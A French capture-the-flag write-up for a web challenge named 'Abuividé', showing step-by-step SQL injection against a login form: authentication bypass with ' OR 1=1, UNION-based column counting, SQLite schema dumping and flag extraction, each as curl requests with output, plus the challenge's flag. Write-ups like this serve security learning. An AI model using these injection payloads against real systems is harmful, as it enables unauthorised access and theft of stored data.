---
# Imported from Obsidian: Abuividé – Web Medium (200 pts).md
# Draft: unknown source
title: Abuividé – Web Medium
category: Web
difficulty: Medium
ctf: Unknown
date: 2026-09-25
summary: Un site de démonstration propose une simple page de connexion. On sait qu'un administrateur stocke un secret dans la base de données et qu'il ne faut surtout pas que ce secret…
tags:
- web
lang: fr
draft: true
imported: true
---

**CTF** : ESIG Tech Arena  
**Auteur** : KodjoDoDjango  
**URL** : https://chal-6-abuivide.ctf.esig.tg/  
**Flag** : `EthACTF{sqli_leaks_everything}`

---

## Description

> Un site de démonstration propose une simple page de connexion.  
> On sait qu'un administrateur stocke un secret dans la base de données et qu'il ne faut surtout pas que ce secret fuite.  
> Récupérez le flag en vous authentifiant.

---

## Reconnaissance

```bash
curl -k https://chal-6-abuivide.ctf.esig.tg/
```

Page d’accueil minimaliste avec un lien vers `/login`.

```bash
curl -k https://chal-6-abuivide.ctf.esig.tg/login
```

Formulaire de connexion classique + **astuce volontaire** :

```html
<em>Astuce : essayez ' OR 1=1 -- -</em>
```

→ Injection SQL clairement indiquée.

---

## Exploitation

### 1. Bypass d’authentification

```bash
curl -k -X POST https://chal-6-abuivide.ctf.esig.tg/login \
  -d "username=' OR 1=1 -- -&password=x"
```

Réponse :
```
Bienvenue, admin !
Votre identifiant : 1
Votre mot de passe : mot_de_passe_admin_secret
```

Login réussi en tant qu’admin.

### 2. Découverte du nombre de colonnes (UNION)

```bash
curl -k -X POST https://chal-6-abuivide.ctf.esig.tg/login \
  -d "username=' UNION SELECT 1,2,3 -- -&password=x"
```

→ Affiche `Bienvenue, 2` et `mot de passe : 3`  
→ **3 colonnes** sont extraites et affichées.

### 3. Identification du SGBD

```bash
curl -k -X POST https://chal-6-abuivide.ctf.esig.tg/login \
  -d "username=' UNION SELECT 1,sqlite_version(),3 -- -&password=x"
```

→ `3.46.1` → **SQLite**.

### 4. Dump du schéma

```bash
curl -k -X POST https://chal-6-abuivide.ctf.esig.tg/login \
  -d "username=' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -&password=x"
```

Tables trouvées :
- `users (id, username, password)`
- `flags (id, flag)` ← table intéressante

### 5. Extraction du flag

```bash
curl -k -X POST https://chal-6-abuivide.ctf.esig.tg/login \
  -d "username=' UNION SELECT 1,flag,3 FROM flags -- -&password=x"
```

**Résultat :**
```
Bienvenue, EthACTF{sqli_leaks_everything} !
```

---

## Flag

```
EthACTF{sqli_leaks_everything}
```

---

## Résumé de la chaîne

1. Astuce SQLi fournie
2. Bypass `OR 1=1`
3. UNION → 3 colonnes
4. `sqlite_master` → table `flags`
5. Extraction directe du flag
